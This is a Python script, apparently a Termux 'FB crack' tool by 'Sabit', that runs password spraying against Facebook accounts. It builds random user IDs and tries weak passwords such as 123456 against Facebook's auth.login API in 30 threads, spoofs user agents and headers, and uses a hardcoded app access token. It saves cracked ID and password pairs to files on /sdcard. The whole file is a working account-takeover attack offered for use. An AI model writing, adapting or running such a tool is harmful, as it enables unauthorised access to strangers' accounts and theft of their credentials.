import os
import marshal
import os,sys,time,json,random,re,string,platform,base64,uuid
import requests,bs4,datetime,re,urllib3,httpx,mechanize,rich
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as tred 
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install bs4')
sys.stdout.write('\x1b[1;35m\x1b]2; 彡Sabit Zoneヅ \x07')
A0="\033[1;30m"
A1="\033[1;31m"
A2="\033[1;32m"
A3="\033[1;33m"
A4="\033[1;34m"
A5="\033[1;35m"
A6="\033[1;36m"
A7="\033[1;37m"
dot2=f' {A1}[{A2}◉{A1}]{A2}'
dot1=f'{A1}[{A2}◉{A1}]{A2}'
Tik=f'{A1}[{A2}√{A1}]{A2}'
ok = []
cp = []
loop=0
user=[]

def Alhaj_uafb():
    ax = str(random.choice(range(5,7)))
    ac3=str(random.choice(range(1,36)))
    bx3 = str(random.choice(range(8,12)))
    bx4 = str(random.choice(range(552,661)))
    As1=f"Mozilla/5.0 (Windows; U; Windows NT {ax}.1; en-US) AppleWebKit/534.{ac3} (KHTML, like Gecko) Chrome/{bx3}.0.{bx4}.0 Safari/534.{ac3}"
    return (As1)

logo=(f"""
 {A1}  ╔═══════════════════════════════════╗
 {A1}  ║{A6}     ╔═╗╔╗    ╔═╗╦═╗╔═╗╔═╗╦╔═   {A1}   ║
 {A1}  ║{A2}     ╠╣ ╠╩╗═══║  ╠╦╝╠═╣║  ╠╩╗     {A1}   ║
 {A1}  ║{A6}     ╚  ╚═╝   ╚═╝╩╚═╩ ╩╚═╝╩ ╩      {A1}.     ║
 {A1}  ╚═══════════════════════════════════╝ {A2}-by Sabit

{A1}╔═════════════════════════╦═════════════════════════╗
{A1}║ {A2}ᎪႮͲᎻϴᎡ • 彡Sabitヅ {A1}║ {A2}ᏀᏆͲᎻႮᏴ : Sabit                    {A1}  ║
{A1}║ {A2}ᏙᎬᎡՏᏆϴΝ • A.1.0       {A1}║{A2} ՏͲᎪͲႮՏ : ҒᎡᎬᎬ                    {A1}  ║
{A1}║ {A2}ͲϴϴᏞՏ • Fb ᏟᏞϴΝᎬ    {A1}║ {A2}ՏƳՏͲᎬᎷ : ᎠᎪͲᎪ & ᏔᏆҒᏆ {A1}   ║
{A1}╚═════════════════════════╩═════════════════════════╝""")

def Alhaj_404():
	os.system('clear')
	#os.system('xdg-open https://facebook.com/groups/fb.crack.termux.all.free.command/')
	print(logo)
	print(f"{A1}╔════════════════════════════════════════════════╗")
	print(f"{A1}║ {dot1}{A6} ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ {A2}: {A6}[{A2}30000{A6}] [{A2}40000{A6}] [{A2}50000{A6}] {A1}║")
	print(f"{A1}╚════════════════════════════════════════════════╝")
	limit = int(input(f" {dot2} ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :{A6} "))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(10))
		user.append(nmp)
	with tred(max_workers=30) as fbck:
		fbcx = "10000"
		os.system("clear")
		print(logo)
		tl = str(len(user))
		print(f"{A1}╔═════════════════════════════════════╗")
		print(f'{A1}║{Tik} ƳϴႮᎡ ͲϴͲᎪᏞ ᏆᎠ :{A6} {tl}')
		print(f'{A1}║{Tik} ƳϴႮᎡ ᎷᎬͲᎻϴᎠ : {A6}ᎷᎪХ')
		print(f'{A1}║{Tik} ՏႮᏢᎬᎡ ҒᎪՏͲ ՏᏢᎬᎬᎠ ᏟᏞϴΝᏆΝᏀ')
		print(f'{A1}║{Tik} ᎷᏆХ ҒᏴ ϴᏞᎠ ᏆᎠ ᏟᏞϴΝᎬ ͲϴϴᏞՏ ')
		print(f"{A1}╚═════════════════════════════════════╝")
		for fbc in user:
			uid = str(fbcx+fbc)
			pas = ['123456','123123','1234567','12345678','123456789']
			fbck.submit(Fbcrack,uid,pas,tl)
	print("")
	print(f"{A1}╔══════════════════════════════════════╗")
	print(f"{A1}║{Tik} ᏟᎡᎪᏟᏦ ՏႮᏟᏟᎬՏՏҒႮᏞᏞᎽ ")
	print(f"{A1}║{Tik} ҒᏴ-ᏟᎡᎪᏟᏦ ᎪᏞϴᏔᎬՏ ҒᏆᎡᎬ ")
	print(f'{A1}║{Tik} ͲϴͲᎪᏞ ϴᏦ ᏆᎠ : '+str(len(ok)))
	print(f'{A1}║{Tik} ͲϴͲᎪᏞ ᏟᏢ ᏆᎠ : '+str(len(cp)))
	print(f"{A1}║{Tik} ҒᏴ-ᏟᎡᎪᏟᏦ ͲᎬᎡᎷႮХ ᎪᏞᏞ ҒᎡᎬᎬ ᏟϴᎷᎷᎪΝᎠ")
	print(f"{A1}║{Tik} ҒᏴ-ᏟᎡᎪᏟᏦ ᎪᎠᎷᏆΝ ᏴᎽ Sabit")
	print(f"{A1}╚══════════════════════════════════════╝");exit()


def Fbcrack(uid,pas,tl):
	global loop,ok,cp
	Emj=random.choice(['🥰','🤣','🤭','😜','😁','🤫','😃','😝','😀','🥱','😎','😴','😍','😊','😄','☺️','😙','🙀','🤪','😵','👻','🙈','💖','😋'])
	Emoj=random.choice(['🤭','🥰','🤣','🤭','😜','😁','🤫','😃','😝','😀','🥱','😎','😴','😍','😊','😄','☺️','😙','🙀','🤪','😵','👻','🙈','💖','😋'])
	Emojx=random.choice(['🤣','🥰','🔥','😁','😍','😮','😎','😝','🙈','😁','😜','😵','👻','😃'])
	Clorhx=random.choice([f'🥰{A1}',f'😝{A2}',f'🤭{A6}',f'😃{A4}',f'🤫{A5}',f'🤣{A6}',f'😁{A7}',f'😜{A0}'])
	sys.stdout.write(f'\r {A1}[{Clorhx}ՏᎬᎪᎡᏟᎻᏆΝᏀ{A1}]{Emoj}[{A6}%s{A1}]{Emj}[{A2}ϴᏦ-%s{A1}]{Emojx}[{A2}ᏟᏢ-%s{A1}]\r'%(loop,len(ok),len(cp)))
	sys.stdout.flush()
	try:
		for ps in pas:
			with requests.Session() as session:
				headers={'x-fb-connection-bandwidth': str(random.randint(20000000,30000000)),
				'x-fb-sim-hni': str(random.randint(20000, 40000)),
				'x-fb-net-hni': str(random.randint(20000, 40000)),
				'x-fb-connection-quality': 'EXCELLENT',
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
				'user-agent': Alhaj_uafb(),
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-http-engine': 'Liger'}
				po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
				if "www.facebook.com" in str(po):
					print(f'{A6}[{A2}ҒᏴ-ᏟᎡᎪᏟᏦ-{A1}ᏟᏢ{A6}]{A2} {uid} {A6}◉{A2} {ps}')
					open("/sdcard/ALHAJ-404_OLD-CP.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					cp.append(uid)
					break
				elif "access_token" in po:
					print(f'{A6}[{A2}ҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ{A6}]{A2} {uid} {A6}◉{A2} {ps}')
					open("/sdcard/ALHAJ-404_OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					ok.append(uid)
					break
				else:pass
			loop+=1
	except Exception as e:pass


Alhaj_404()